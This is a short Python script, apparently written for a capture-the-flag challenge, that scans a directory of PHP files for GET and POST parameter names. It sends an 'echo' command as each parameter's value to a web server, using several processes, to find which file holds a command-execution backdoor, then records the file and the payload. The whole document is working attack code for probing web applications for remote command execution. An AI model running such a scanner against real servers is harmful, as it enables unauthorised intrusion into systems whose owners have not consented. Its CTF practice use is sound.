import multiprocessing
import requests, re
import glob, os

baseurl = 'http://temp/'
# url = 'http://3cebfa06-1730-431b-8275-dbf0c536419b.node3.buuoj.cn/'
files = list(glob.glob("*.php"))
key = '1234567'
echo = f'echo {key}'

def save(file, payload):
    f = open('result.txt', 'w')
    f.write(f'{file},{payload}')
    f.close()


def exp(start, end):
    for i in range(start, end):
        if os.path.isfile('result.txt'):
            exit(1)
        file = files[i]
        url = baseurl+file
        txt = open(files[i], 'r').read()
        gets = re.findall(r"_GET\['(.*?)'\]", txt)
        posts = re.findall(r"_POST\['(.*?)'\]", txt)

        def check(res):
            if key in res.text:
                print('The back door is ', file, payload)
                save(file, payload)
                exit(1)

        for g in gets:
            payload = f'{url}?{g}={echo}'
            print(payload)
            res = requests.get(payload)
            check(res)
        for p in posts:
            data = {p: echo}
            print(url, data)
            res = requests.post(url, data=data)
            check(res)
        try:
            os.renames(file, f'done/{file}')
        except Exception as e:
            pass


if __name__ == '__main__':
    num = 2
    length = len(files)
    step = length // num

    step, mod = divmod(length, num)
    print(length, num,  step,mod)
    for i in range(0, step * num, step):
        # exp(i, i + step)
        p = multiprocessing.Process(target=exp, args=(i, i + step))
        p.start()
    if mod:
        exp(step * num, step * num + mod)
    # exp(0,1)